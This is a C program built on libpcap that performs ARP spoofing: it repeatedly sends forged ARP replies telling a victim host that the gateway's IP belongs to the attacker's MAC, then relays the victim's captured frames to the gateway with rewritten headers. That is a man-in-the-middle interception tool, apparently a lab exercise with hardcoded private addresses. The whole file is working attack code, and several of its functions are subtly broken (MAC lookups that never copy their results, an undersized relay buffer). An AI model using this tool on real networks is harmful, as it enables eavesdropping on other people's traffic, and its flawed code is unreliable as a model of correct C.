#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include <pcap.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>

#pragma pack(1)

struct ether_h
{
  u_char ether_dst_mac[6];  /*dst_mac 6byte*/
  u_char ether_src_mac[6];  /*src_mac 6byte*/  
  u_short ether_type; //2byte
};

struct arp_h {
    u_short hType; /*hardware type*/
    u_short protocl; /*protocol*/
    u_char hSize; /*hardware size*/
    u_char pSize; /*protocol size*/
    u_short opcode; /*opcode*/
    u_char sndMacAddr[6]; /*sender mac address*/
    struct in_addr sndIP; /*sender ip address*/
    u_char tarMacAddr[6]; /*target mac address*/
    struct in_addr tarIP; /*target ip address*/
};

struct arp_packet {
    struct ether_h eHeader;
    struct arp_h aHeader;
    char *interface;
};

struct modi_packet{
    struct ether_h eHeader;
    u_char victimMac[6];
    char *interface;
};

void getVictimMac(u_char* vicMacAddr, uint32_t vicIPAddr, char* device){
    //this function is for get arp packet and parse victim mac addr
    struct ether_h* eHeader;
    struct arp_h*   aHeader;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", device, errbuf);
        return;
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)           //use when you using loop
            continue;
        if (res == -1 || res == -2) 
            break;

        eHeader = (struct ether_h *)packet;

        if ( ntohs(eHeader->ether_type) == ETHERTYPE_ARP){
            packet += sizeof(struct ether_h);
            aHeader = (struct arp_h *)packet;
            
            if( ntohs(aHeader->opcode) == 0x02 && ntohl(aHeader->sndIP.s_addr) == vicIPAddr){
                printf("catch!!\n");
                vicMacAddr = (u_char *)aHeader->sndMacAddr;
                return;
            }
            
        }
    }

}

void getMyMacAddr(u_char* myMacAddr, char* device){
    //this function for getMyMac Address
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, device);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        myMacAddr = (u_char*)s.ifr_addr.sa_data;
    }
}

void* relayPacket(void* t_pac){
    pcap_t *packetPointer;

    struct modi_packet* t_packet = (struct modi_packet*)t_pac;

    struct ether_h* eHeader;

    char errbuf[PCAP_ERRBUF_SIZE];

    packetPointer = pcap_open_live(t_packet->interface, 100, PCAP_WARNING_PROMISC_NOTSUP, 1000, errbuf);

    pcap_t* handle = pcap_open_live(t_packet->interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", t_packet->interface, errbuf);
        return 0;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);
        u_char* buffer = (u_char*)malloc(sizeof(header->caplen));

        /*printf("\n\n ----------------original packet content----------------\n");
            for(int i = 0; i < header->caplen; i++){
                printf("%2X ",packet[i]);
            }
        printf("\n\n ----------------original packet end   ----------------\n");*/

        eHeader = (struct ether_h*)packet;
        if( memcmp(eHeader->ether_src_mac, t_packet->victimMac, 6) == 0 ){
            memcpy(buffer, packet, (header->caplen));

            memcpy(buffer, t_packet->eHeader.ether_dst_mac, 6);
            memcpy(buffer+6, t_packet->eHeader.ether_src_mac, 6);

            /*printf("\n\n ----------------copy packet content----------------\n");
            for(int i = 0; i < header->caplen; i++){
                printf("%2X ",buffer[i]);
            }
            printf("\n\n ----------------copy packet end   ----------------\n");*/

            // change mac address and send to getway
            if( packetPointer == NULL){
                fprintf(stderr, "\nUnable to open the adapter. %s is not supported by winPcap\n", t_packet->interface);
                return 0;
            }

            /*printf("\n\n ----------------spoofed packet content----------------\n");
            for(int i = 0; i < header->caplen; i++){
                printf("%2X ",buffer[i]);
            }
            printf("\n\n ----------------spoofed packet end   ----------------\n");*/

            printf("relay!!!\n");
            if( pcap_sendpacket(packetPointer, buffer, (header->caplen)) != 0){
                fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(packetPointer));
                return 0;
            }
        }
    }
}

void* sendPacket(void* t_pac){
    pcap_t *packetPointer;
    
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[60];
    int i;
    struct arp_packet *t_packet;

    t_packet = (struct arp_packet*)t_pac;

    memcpy(packet, t_packet, 42);

    if( (packetPointer = pcap_open_live(t_packet->interface, 100, PCAP_WARNING_PROMISC_NOTSUP, 1000, errbuf)) == NULL){
        fprintf(stderr, "\nUnable to open the adapter. %s is not supported by winPcap\n", t_packet->interface);
        return 0;
    }

    while(1){
        printf("Sending!!!\n");
        if( pcap_sendpacket(packetPointer,packet, 60) != 0){
            fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(packetPointer));
            return 0;
        }
        sleep(5);
    }
}

void sendPacketThread(struct arp_packet* toVicPac, struct modi_packet* modiMac){
    int status1, status2;
    pthread_t thread1, thread2;

    
    pthread_create(&thread1, NULL, sendPacket, (void *)toVicPac);
    //pthread_create(&thread2, NULL, sendPacket, (void *)toGatePac);
    pthread_create(&thread2, NULL, relayPacket,(void *)modiMac);

    pthread_join(thread1, (void**)&status1);
    pthread_join(thread2, (void**)&status2);
    //pthread_join(thread3, (void**)&status3);
}

int main(int argc, char **argv){

    int i;
    //struct ether_h* eHeader = (struct ether_h*)malloc(sizeof(struct ether_h));
    //struct arp_h* aHeader = (struct arp_h*)malloc(sizeof(struct arp_h));

    struct arp_packet* toVicPac = (struct arp_packet*)malloc(sizeof(struct arp_packet));
    struct arp_packet* toGatePac = (struct arp_packet*)malloc(sizeof(struct arp_packet));

    struct modi_packet* modiMac = (struct modi_packet*)malloc(sizeof(struct modi_packet));

    //char *dev = argv[1];

    uint32_t tMyIP = (uint32_t)inet_addr("192.168.152.138");
    //uint32_t tVicIP = (uint32_t)inet_addr("192.168.152.129");
    uint32_t tVicIP = (uint32_t)inet_addr(argv[2]);
    //uint32_t tgateIP = (uint32_t)inet_addr("192.168.152.2");
    uint32_t tgateIP = (uint32_t)inet_addr(argv[3]);

    // packet[60];

    /*inet_aton(argv[3], &aHeader.sndIP);
    inet_aton(argv[2], &aHeader.tarIP);*/

    //char *inet_ntoa(struct in_addr in);


    u_char* tMyMac = (u_char*)malloc(sizeof(u_char) * 6);
    getMyMacAddr(tMyMac, argv[1]);

    //u_char tVicMac[6] = {0x00, 0x0C, 0x29, 0xF7, 0x21, 0xFC};
    u_char* tVicMac = (u_char*)malloc(sizeof(u_char) * 6);
    getVictimMac(tVicMac, tVicIP, argv[1]);

    //u_char tgateMac[6] = {0x00, 0x50, 0x56, 0xF4, 0x89, 0xFB};
    u_char* tgateMac = (u_char*)malloc(sizeof(u_char) * 6);
    getVictimMac(tgateMac, tgateIP, argv[1]);

    u_short etherType = 0x0806;

    memcpy(modiMac, tgateMac, 6);
    memcpy(modiMac+6, tMyMac, 6);
    memcpy(modiMac->victimMac, tVicMac, 6);
    modiMac->interface = argv[1];

    //u_char arp_tools[8] = {0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02};

    memcpy(toVicPac->eHeader.ether_dst_mac, tVicMac, 6);
    memcpy(toVicPac->eHeader.ether_src_mac, tMyMac, 6);
    toVicPac->eHeader.ether_type = htons(etherType);

    /*for(i = 0; i < 14; i++){
        printf("%02x ",packet[i]);
    }*/

    toVicPac->aHeader.hType = htons(0x0001);
    toVicPac->aHeader.protocl = htons(0x0800);
    toVicPac->aHeader.hSize = 0x06;
    toVicPac->aHeader.pSize = 0x04;
    toVicPac->aHeader.opcode = htons(0x0002);
    memcpy(toVicPac->aHeader.sndMacAddr,tMyMac, 6);
    memcpy(toVicPac->aHeader.tarMacAddr,tVicMac, 6);
    inet_aton("192.168.152.2", &(toVicPac->aHeader.sndIP));
    inet_aton("192.168.152.129", &(toVicPac->aHeader.tarIP)); 
    toVicPac->interface = argv[1];
    //sendPacketThread(toVicPac);
    /* --------------------------send to victim-----------------------*/
    //start to make packet to gateway


    /*memcpy(toGatePac->eHeader.ether_dst_mac, tgateMac, 6);
    memcpy(toGatePac->eHeader.ether_src_mac, tMyMac, 6);
    toGatePac->eHeader.ether_type = htons(etherType);*/

    /*for(i = 0; i < 14; i++){
        printf("%02x ",packet[i]);
    }*/

    /*toGatePac->aHeader.hType = htons(0x0001);
    toGatePac->aHeader.protocl = htons(0x0800);
    toGatePac->aHeader.hSize = 0x06;
    toGatePac->aHeader.pSize = 0x04;
    toGatePac->aHeader.opcode = htons(0x0002);
    memcpy(toGatePac->aHeader.sndMacAddr,tVicMac, 6);
    memcpy(toGatePac->aHeader.tarMacAddr,tgateMac, 6);
    inet_aton("192.168.152.129", &(toGatePac->aHeader.sndIP));
    inet_aton("192.168.152.2", &(toGatePac->aHeader.tarIP)); */
    sendPacketThread(toVicPac, modiMac);

    //To get my MacAddr
    //getMyMacAddr(myMacAddr, dev);

    free(toVicPac);
    free(toGatePac);
    free(modiMac);
    free(tMyMac);
    free(tVicMac);
    return 0;
}